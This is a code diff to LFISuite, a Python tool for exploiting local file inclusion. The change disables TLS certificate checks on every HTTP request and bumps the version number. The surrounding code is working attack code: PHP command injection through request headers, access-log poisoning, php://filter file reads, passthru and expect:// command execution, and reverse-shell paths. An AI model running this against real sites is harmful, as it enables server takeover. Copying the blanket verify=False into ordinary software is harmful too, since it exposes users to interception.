@@ -49,6 +49,9 @@ except:
 	solve_dependencies("requests")
 	import requests
 
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
 try:
 	import socks
 except:
@@ -65,7 +68,7 @@ except:
 	from termcolor import colored
 
 netcat_url = "https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe"
-LFS_VERSION = '1.12' # DO NOT MODIFY THIS FOR ANY REASON!!
+LFS_VERSION = '1.13' # DO NOT MODIFY THIS FOR ANY REASON!!
 
 #--------- Auto-Hack Global Variables ----------#
 ahactive     = False
@@ -171,7 +174,7 @@ def banner():
    *###/..,/(*(###/   ** ,#### (/          /####/ * (###########  *#### (..###( #/. . *######/, *
    /########/.####**#*/( *###( #*        *#####. %(,./#######(, # (###( # *###/ #*   ., .*####/.(.
    /########/ ####,/(.   //,  (#*       ,*/((, ##/. .   ...  ,%#/ (/,  (#     /#/.      ,*  ,/./(.
-   .********, /*. .#/   .*##(/,.        ,/(###(*.     .,*****,.  ./##(/,. .,**,.           .*/(/,     v 1.12
+   .********, /*. .#/   .*##(/,.        ,/(###(*.     .,*****,.  ./##(/,. .,**,.           .*/(/,     v 1.13
              ./#(/*.
 
 	"""
@@ -440,9 +443,9 @@ def execSeCmd(cmd):
 		se_headers['%s' %se_header_par] = '<?php %s ?>' %cmd
 	#print "se_headers = %s\n---------" %se_headers # useful for debugging
 	if(cmd != reverseConn):
-		r = requests.get(se_url, headers=se_headers, timeout=15)
+		r = requests.get(se_url, headers=se_headers, timeout=15, verify=False)
 	else:
-		r = requests.get(se_url, headers=se_headers)
+		r = requests.get(se_url, headers=se_headers, verify=False)
 	resp = r.text
 
 	'''print "\nse_headers:\n%s\n\n" %se_headers
@@ -491,7 +494,7 @@ def hackSE(par):
 		se_par = par
 	se_header_par = getTranslatedPar(se_par)
 
-	r = requests.get(se_url, headers=se_headers, timeout=15)
+	r = requests.get(se_url, headers=se_headers, timeout=15, verify=False)
 	resp = r.text
 
 	if("%s=" %se_par in resp):
@@ -695,7 +698,7 @@ def phpinfo_request(headers,cmd,path1,path,test,host):
 				break
 
 		tmp_url = "%s%s%s" %(host,path1,tmp_name)
-		r = requests.get(tmp_url,headers=gen_headers,timeout=15)
+		r = requests.get(tmp_url,headers=gen_headers,timeout=15, verify=False)
 		content = r.content
 		#print "content: \n%s\n\n" %content
 		got = phpinfo_ext(content)
@@ -830,7 +833,7 @@ def run_phpfilter():
 		if(filterpage == "0"):
 			break
 		filterurl = "%sphp://filter/convert.base64-encode/resource=%s" %(ofilterurl,filterpage)
-		r = requests.get(filterurl,headers=gen_headers,timeout=15)
+		r = requests.get(filterurl,headers=gen_headers,timeout=15, verify=False)
 		filtercontent = r.text
 
 		found = phpfilter_extract(filtercontent)
@@ -919,9 +922,9 @@ def access_log_ext(url, keyword):
 	global access_log_reverse
 
 	if(access_log_reverse):
-		r = requests.get(url,headers=gen_headers)
+		r = requests.get(url,headers=gen_headers, verify=False)
 	else:
-		r = requests.get(url,headers=gen_headers,timeout=15)
+		r = requests.get(url,headers=gen_headers,timeout=15, verify=False)
 
 	resp = r.text
 	get_indexes = SubstrFind(resp,keyword)
@@ -960,9 +963,9 @@ def simpleGETorHEAD(keyword, ologurl, logmain):
 	send_access_log_cmd("echo %s" %randStr, logmain, keyword)
 
 	if(access_log_reverse):
-		r = requests.get(url,headers=gen_headers)
+		r = requests.get(url,headers=gen_headers, verify=False)
 	else:
-		r = requests.get(ologurl,headers=gen_headers,timeout=15)
+		r = requests.get(ologurl,headers=gen_headers,timeout=15, verify=False)
 
 	resp = r.text
 	print colored("\nTrying to inject the website using simple %s requests." %keyword, "white")
@@ -1007,7 +1010,7 @@ def simpleGETorHEAD(keyword, ologurl, logmain):
 		rand_str = generateRandom()
 
 		send_access_log_cmd("echo '%s';" %rand_str,logmain,keyword+"_PHP")
-		resp = (requests.get(ologurl,headers=gen_headers,timeout=15)).text
+		resp = (requests.get(ologurl,headers=gen_headers,timeout=15, verify=False)).text
 		if(access_control(resp,keyword+"_PHP",rand_str)):
 			print "[+] The website seems to be vulnerable. Opening a Shell.."
 			time.sleep(1)
@@ -1065,9 +1068,9 @@ def send_passthru_cmd(ologurl,cmd,start_get):
 	url = "%s&cmd=%s" %(ologurl,cmd)
 
 	if(cmd == reverseConn):
-		r = requests.get(url,headers=gen_headers)
+		r = requests.get(url,headers=gen_headers, verify=False)
 	else:
-		r = requests.get(url,headers=gen_headers,timeout=15)
+		r = requests.get(url,headers=gen_headers,timeout=15, verify=False)
 
 	resp = r.text
 
@@ -1079,11 +1082,11 @@ def GetPassthru(ologurl, logmain):
 	print colored("\nTrying to inject the website using GET 'passthru' requests.", "white")
 	rand_str = generateRandom()
 	url = "%s&cmd=echo %s" %(ologurl,rand_str)
-	resp = (requests.get(url,headers=gen_headers,timeout=20)).text
+	resp = (requests.get(url,headers=gen_headers,timeout=20, verify=False)).text
 	vuln_count_before = len(SubstrFind(resp,"GET /%s" %rand_str))
 
 	send_passthru_req(logmain)
-	r = requests.get(url,headers=gen_headers,timeout=20)
+	r = requests.get(url,headers=gen_headers,timeout=20, verify=False)
 	resp = r.text
 	vulns = SubstrFind(resp,"GET /%s" %rand_str)
 	vuln_count_after = len(vulns)
@@ -1294,9 +1297,9 @@ def data_reverse_shell(odataurl,found):
 
 def send_data_cmd_generic(url):
 	if(data_reverse):
-		content = (requests.get(url,headers=gen_headers)).text
+		content = (requests.get(url,headers=gen_headers, verify=False)).text
 	else:
-		content = (requests.get(url,headers=gen_headers,timeout=15)).text
+		content = (requests.get(url,headers=gen_headers,timeout=15, verify=False)).text
 	return content
 
 def send_data_cmd_simple_nosl(cmd,url):
@@ -1463,9 +1466,9 @@ def expect_reverse_shell(oexpecturl):
 def send_expect_cmd(cmd,url):
 	newurl = "%sexpect://%s" %(url,cmd)
 	if(expect_reverse):
-		content = (requests.get(newurl,headers=gen_headers)).text
+		content = (requests.get(newurl,headers=gen_headers, verify=False)).text
 	else:
-		content = (requests.get(newurl,headers=gen_headers,timeout=15)).text
+		content = (requests.get(newurl,headers=gen_headers,timeout=15, verify=False)).text
 	return content
 
 def extract_expect_res(resp):
@@ -1542,8 +1545,8 @@ def send_self_fd_cmd(errPage,cmd,field,ofdurl):
 		cmd = "%s **<?php system(\"%s\"); ?> **" %(fd_pre_rand_str,cmd)
 
 	fd_headers[field] = cmd
-	r = requests.get(errPage,headers=fd_headers,timeout=15)
-	r = requests.get(ofdurl, headers=bu_headers,timeout=15)
+	r = requests.get(errPage,headers=fd_headers,timeout=15, verify=False)
+	r = requests.get(ofdurl, headers=bu_headers,timeout=15, verify=False)
 	return r.text
 
 def extract_fd_Result(resp):
@@ -1645,7 +1648,7 @@ def scanner():
 	    status_code = 500
 
 	    try:
-	    	r = requests.get(website, headers=gen_headers, timeout=7)
+	    	r = requests.get(website, headers=gen_headers, timeout=7, verify=False)
 	    	content = r.content
 	    	status_code = 200
 	    except:
